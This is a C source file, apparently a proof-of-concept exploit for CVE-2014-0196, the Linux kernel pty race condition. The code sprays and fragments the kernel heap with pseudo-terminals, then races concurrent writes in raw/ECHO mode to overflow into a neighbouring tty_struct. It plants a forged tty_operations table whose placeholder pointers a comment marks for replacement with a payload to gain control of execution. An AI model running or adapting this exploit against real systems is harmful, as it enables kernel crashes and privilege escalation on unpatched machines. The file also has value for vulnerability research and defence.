#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/mman.h>
#include <termios.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>

#define MAX_FORK 9 
#define MAX_FD 900
#define TTY_MAGIC 0x5401
 
 
struct device;
struct tty_driver;
struct tty_operations;
 
typedef struct {
    int counter;
} atomic_t;
 
struct kref {
    atomic_t refcount;
};
 
struct tty_struct_header {
    int magic;
    int kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
} overwrite;

struct manager {
	pid_t tasks[MAX_FORK];
	pid_t parent;
	pid_t sync;
	pid_t child;
	unsigned long cnt_forked;
	int sync_bombing;
};



/*---------- Global variables ----------*/

int master_fd, slave_fd;
struct manager *Manager;

int Sync;

char readBuf[512];
char badStr[256];
char badStr2[256];
char badStr3[256];

char scratch[1024] = {0};
void *tty_operations[64];

/*---------- Libc wrappers ----------*/

int open_pty(int *master) {
	char *slave_path;
	int slave_fd;

	if((*master = open("/dev/ptmx", O_RDWR | O_NONBLOCK)) == -1) {
		printf("errno %d\n", errno);
		perror("1");
		return -1;
	}
	if(grantpt(*master) || unlockpt(*master)) {
		perror("2");
		return -1;
	}
	slave_path = (char *) ptsname(*master);
	slave_fd = open(slave_path, O_RDWR | O_NOCTTY | O_NONBLOCK);
	if(slave_fd == -1)
		perror("3");
	return slave_fd;
}

int set_vuln_flags(int target_fd) {
	struct termios tp;

	// enable raw mode with ECHO to trigger the bug
	if(tcgetattr(target_fd, &tp) == -1)
		return -1;
	cfmakeraw(&tp); // same as tp.c_oflag &= ~OPOST;
	tp.c_lflag |=  ECHO;
	if(tcsetattr(target_fd, TCSAFLUSH, &tp) == -1)
		return -1;

	return 0;
}

void kill_all() {
	unsigned long i;
	for(i = 0; i < Manager->cnt_forked; ++i) {
		kill(Manager->tasks[i], SIGKILL);
		waitpid(Manager->tasks[i], NULL, 0);
	}
}

void sync_handler(int sig) {
	Sync = 1;
}

void error_handler(int sig) {
	kill_all();
	exit(1);
}

void setup_sig_handlers() {
	struct sigaction act;
	struct sigaction act2;

	memset(&act, 0, sizeof act);
	memset(&act2, 0, sizeof act2);

	act.sa_handler = sync_handler;
	act2.sa_handler = error_handler;

	sigaction(SIGUSR1, &act, NULL);
	sigaction(SIGUSR2, &act2, NULL);
}


// for debugging purpose in kernel
void taint_process(void) {
	__asm__("mov r7, #300\n\t"
			"add r7, #78\n\t"
			"svc #0");
}

/*---------- tasks ----------*/

void spray_fn(void) {
	int spray_master[MAX_FD/2], spray_slave[MAX_FD/2];
	int i;

	// Step 1. stabilize heap
	for(i = 0; i < MAX_FD/2; ++i) {
		spray_slave[i] = open_pty(&spray_master[i]);
		if(spray_slave[i] == -1) {
			perror("spray");
			kill(Manager->parent, SIGUSR2);
			exit(1);
		}
	}

	kill(Manager->parent, SIGUSR1);
	
	// Step 2. Wait all spray to finish before making holes or we'll fill our own holes ...
	// busy wait
	while(!Sync) usleep(10);
	Sync = 0;

	// Step 3. make holes every 6 elements
	for(i = 0; i < MAX_FD/2; i += 6) {
		close(spray_master[i]);
		close(spray_slave[i]);
	}

	kill(Manager->parent, SIGUSR1);

	// Final step. infinite loop :  
	while(1) {
		// wait parent trigger exploit
		while(!Sync) usleep(10);
		Sync = 0;
		
		// check if worked
		for(i = 1; i < MAX_FD/2; i += 6) {
			if(ioctl(spray_master[i], 0xdeadbeef) || ioctl(spray_slave[i], 0xdeadbeef)) {
				//perror("ioctl");
			}
		}
		
		// tell parent to continue, not worked ..
		kill(Manager->parent, SIGUSR1);
	}

}

void child_fn(void) {
	char discard[1024];
	int target_fd = slave_fd;

	if(set_vuln_flags(target_fd)) perror("Set vuln flags");


	while(!Manager->sync_bombing) usleep(10); 

	if(write(target_fd, badStr, sizeof badStr) < 0) 
		if(errno != EAGAIN)
			exit(1);

	// 2nd write
	if(write(target_fd, badStr2, sizeof badStr2) < 0) 
		if(errno != EAGAIN)
			exit(1);

	if(write(target_fd, badStr3, sizeof badStr3) < 0) 
		if(errno != EAGAIN)
			exit(1);

	// eat the incoming data 
	if(read(target_fd, discard, sizeof discard) < 0)
		if(errno != EAGAIN)
			exit(1);
}

/* Increase reliability to start overflow at same time */
void sync_fn(void) {
	while(1) {
		usleep(50); 
		Manager->sync_bombing = 1; // release
		usleep(50);
		Manager->sync_bombing = 0;
	}
}

/*---------- parent init ----------*/

// fork spraying childs one after one (wait each time cf. reason below)
void fork_a_lot(void) {
	unsigned long cnt_fork = 0;
	pid_t child;

	while(cnt_fork < MAX_FORK) {
		child = fork();
		if(child == -1) {
			perror("fork spray");
			kill_all(cnt_fork);
			exit(1);
		} else if (!child) {
			spray_fn();
			exit(0);
		} else { 
			// wait for each spray to finish before spraying again / contiguous memory
			while(!Sync) usleep(10);
			Sync = 0;
			Manager->tasks[cnt_fork++] = child;
			printf("[.] %lu sprayed process\n", cnt_fork);
		}
	}

	Manager->cnt_forked = cnt_fork;
}


void set_payloads(void) {
	int i;

	overwrite.magic = TTY_MAGIC;
	overwrite.kref = 0x1337;
	overwrite.dev = (struct device *) scratch;
	overwrite.driver = (struct tty_driver *) scratch;
	overwrite.ops = (struct tty_operations *) tty_operations;

	for(i = 0; i < 64; ++i) 
		tty_operations[i] = (void *) 0x41414141; // PC control / replace with payload()

	memset(readBuf, 'A', sizeof readBuf);
	memset(badStr, 'B', sizeof badStr);
	memset(badStr2, 'C', sizeof badStr2);
	for(i = 0; i < sizeof badStr3; ++i)
		badStr3[i] = i;

	//228 is the effective observed value with kernel debug, proved to be stable enough
	//When magic corrupted in tty_io.c, dump heap layout filled with pattern
	for(i = 0; i < sizeof overwrite; ++i)
		badStr3[i+0xe4] = ((char *)&overwrite)[i];
		
}

int pre_init() {
	unsigned long cnt_spray_done = 0;
	int i;

	Manager = mmap(NULL, sizeof(struct manager), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	if(Manager == MAP_FAILED) {
		perror("manager mmap");
		return -1;
	}

	Sync = 0;
	setup_sig_handlers();

	set_payloads();


	Manager->parent = getpid();
	Manager->cnt_forked = 0;

	// Do spray
	fork_a_lot(); 

	printf("[+] Waiting for holes..\n");
	for(i = 0; i < Manager->cnt_forked; ++i) {
		kill(Manager->tasks[i], SIGUSR1);
		while(!Sync) usleep(10);
		Sync = 0;
	}


	return 0;
}

/*---------- Parent ----------*/

int main() {
	int target_fd, i, cnt = 0;
	pid_t child, sync;

	taint_process();

	printf("[+] CVE-2014-0196 DOS PoC by Fritz (@anarcheuz)\n");
	printf("[+] pre_init() working ..\n");
	if(pre_init()) exit(1);

	printf("[+] Bruteforce starting ..\n");
	while(1) {

		// hold
		Manager->sync_bombing = 0;

		slave_fd = open_pty(&master_fd);
		if(slave_fd == -1) {
			perror("open_pty");
			kill_all(MAX_FORK);
			exit(1);
		} 

		child = fork();

		// child process
		if(child == -1) {
			perror("fork child");
			exit(1);
		} else if (!child) {
			child_fn();
			exit(0);
		} else {

			Manager->child = child;

			// Sync process
			sync = fork();
			if(sync == -1) {
				perror("fork sync");
				exit(1);
			} else if (!sync) {
				sync_fn();
				exit(0);   
			}

			Manager->sync = sync;

			// master process
			target_fd = master_fd;


			while(!Manager->sync_bombing) usleep(10);
			if(write(target_fd, readBuf, sizeof readBuf) < 0) {
				if(errno != EAGAIN) {
					perror("master write");
					exit(1);
				}
			}

			// shovel the input 
			if(read(target_fd, readBuf, sizeof readBuf) < 0) {
				if(errno != EAGAIN) {
					perror("master read");
					exit(1);
				}
			}
		}

		if(cnt++ % 100 == 0) {
			fprintf(stderr, ".");
		}

		// kill sync and child 
		waitpid(child, NULL, __WALL);
		kill(sync, SIGKILL);
		waitpid(sync, NULL, __WALL);
		
		// ask them to verify if overflow successful
		for(i = 0; i < Manager->cnt_forked; ++i) {
			kill(Manager->tasks[i], SIGUSR1);
			while(!Sync) usleep(10);
			Sync = 0;
		}

		// Free all fds and start over..
		close(master_fd);
		close(slave_fd);
	}

	return 0;
}


